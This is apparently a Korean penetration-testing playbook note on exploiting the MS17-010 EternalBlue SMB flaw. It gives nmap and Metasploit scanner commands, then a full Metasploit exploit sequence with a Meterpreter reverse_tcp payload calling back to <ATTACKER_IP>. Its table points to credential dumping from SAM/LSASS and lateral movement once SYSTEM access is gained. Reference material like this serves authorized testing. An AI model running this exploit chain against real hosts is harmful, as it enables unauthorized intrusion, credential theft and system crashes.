---
tags:
  - 환경/windows
  - 서비스/smb
시작조건: ["SMB 서비스 식별", "MS17-010 영향 가능 Windows 확인"]
필요조건: ["SMB 445 접근 가능", "MS17-010 취약 가능 Windows 버전", "exploit 안정성 검토"]
결과: ["세션", "명령 실행", "SYSTEM 권한"]
---

# MS17-010 EternalBlue SMB RCE

## 한 줄 판단

공격 호스트에서 구형 Windows의 SMB 445번 포트에 연결할 수 있고 비파괴 scanner가 MS17-010 취약 조건을 확인했다면, 시스템 중단 위험과 세션 수신 경로를 검토한 뒤 대상 호스트의 SYSTEM 명령 실행 여부를 검증한다.

## 사용할 때

- SMB 445가 열려 있고 대상이 Windows 7, Windows Server 2008/2012/2016 계열처럼 오래된 빌드로 보일 때.
- SMBv1 또는 MS17-010 관련 취약 신호가 나왔을 때.
- 인증 없이 원격 코드 실행 가능성을 검증해야 할 때.

## 전제 조건

| 조건 | 확인 방법 | 충족 기준 |
|---|---|---|
| SMB 접근 | 포트 스캔 결과 | `445/tcp open` |
| 취약 가능 OS와 SMBv1 | SMB OS 정보, Nmap 또는 Metasploit scanner | 영향 가능 Windows·SMBv1과 전용 scanner의 취약 표시를 함께 확인 |
| 패치 상태 | 승인된 호스트 관리 정보 또는 전용 scanner | MS17-010 보안 업데이트가 확인되면 exploit하지 않음 |
| exploit 안정성 | 모듈 설명, 대상 OS/arch 확인 | crash 위험과 payload 조건을 이해한 상태 |

## 확인할 단서

| 단서 | 의미 | 다음 행동 |
|---|---|---|
| `Host is likely VULNERABLE to MS17-010` | 취약 가능성이 높음 | exploit 모듈과 payload 조건 확인 |
| `SMBv1: True` | legacy SMB 공격면 | MS17-010, 취약 Samba/Windows 여부 검토 |
| OS/arch 불명확 | exploit target 선택 위험 | 추가 OS 확인 또는 `check` 우선 |

## 실행

1. SMB OS/버전 단서를 확인한다.
2. MS17-010 전용 비파괴 scanner로 취약 가능성을 검증한다.
3. target, payload, arch를 맞춘 뒤 exploit 실행 여부를 결정한다.
4. 세션을 얻으면 현재 권한과 호스트 안정성을 먼저 확인한다.

### 명령과 확인할 출력

#### Metasploit scanner

```bash
nmap -p445 --script smb-vuln-ms17-010 <TARGET>

msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET>
run
```

확인할 출력:

- Nmap의 `State: VULNERABLE` 또는 Metasploit의 `Host is likely VULNERABLE to MS17-010`
- 대상 OS, arch, DOUBLEPULSAR 여부
- SMBv1 노출이나 구형 OS만으로 취약함을 확정하지 않는다. scanner가 사용하는 응답 기반 판정도 exploit 성공이나 호스트 안정성을 보장하지 않는다.

#### exploit 실행

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET>
set LHOST <ATTACKER_IP>
set payload windows/x64/meterpreter/reverse_tcp
check
run
```

확인할 출력:

- `The target appears to be vulnerable`
- `Meterpreter session opened`

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| MS17-010 scanner가 취약 가능성을 명확히 표시한다. | SMB 버전과 패치 상태가 취약 후보에 부합 | 취약 가능성 | [[Public Exploit 검토와 검증]]과 [[metasploit]]에서 대상 조건과 모듈 옵션 재확인 |
| scanner 결과 불명확 | OS/SMB 정보 부족, 방화벽, 패치됨 | 시작 상태 유지 | SMB OS 재확인, 다른 scanner, exploit 보류 |
| `check` 실패 | 패치됨, 대상 빌드 불일치 | 시작 상태 유지 | Public exploit 대신 다른 SMB 공격면 확인 |
| exploit 실패 또는 crash | target/arch/payload 불일치, 취약 조건 미충족 | 시작 상태 유지 | target 설정, payload arch, SMBv1 여부 확인 |
| 세션은 열렸지만 불안정 | exploit 특성상 호스트 불안정 | 시작 상태 유지 | 세션 안정화 후 최소한의 후속 행동 |
| Meterpreter, command shell | 세션 확보 | 세션 | 권한 확인, 파일 수집 |
| `whoami`, `hostname` | 명령 실행 확보 | 명령 실행 | 세션의 호스트, 실행 계정과 무결성 수준 확인 |
| `NT AUTHORITY\SYSTEM` | SYSTEM 권한 확보 | SYSTEM 권한 | SAM/LSASS 확인, 내부 이동 |

## 확인할 출력과 권한

- 판정 기준: scanner·`check` 결과와 실제 세션을 구분하고, `getuid` 또는 `whoami`로 SYSTEM 여부를 확인한다.
- 권한 구분: 인증 전·익명·유효 계정 상태를 구분하고, 서비스 응답만으로 실제 권한을 추정하지 않는다.

## 관련 서비스

- [[SMB 서비스]]

## 관련 상태 라우터

- 명령 실행 또는 세션을 확보했으면: [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- `NT AUTHORITY\SYSTEM` 실행 컨텍스트를 확인했으면: [[고권한 세션 확보 후 후속 판단]]

## 관련 도구

- [[metasploit]]
- [[meterpreter]]

## 관련 노트

- [[Public Exploit 검토와 검증]]
- [[metasploit]]
- [[Meterpreter 세션 후속 행동]]

## 참고 링크

- [Microsoft Security Bulletin MS17-010](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [Microsoft Support — verify that MS17-010 is installed](https://support.microsoft.com/en-us/topic/how-to-verify-that-ms17-010-is-installed-f55d3f13-7a9c-688c-260b-477d0ec9f2c8)
- [Nmap smb-vuln-ms17-010 NSE documentation](https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html)
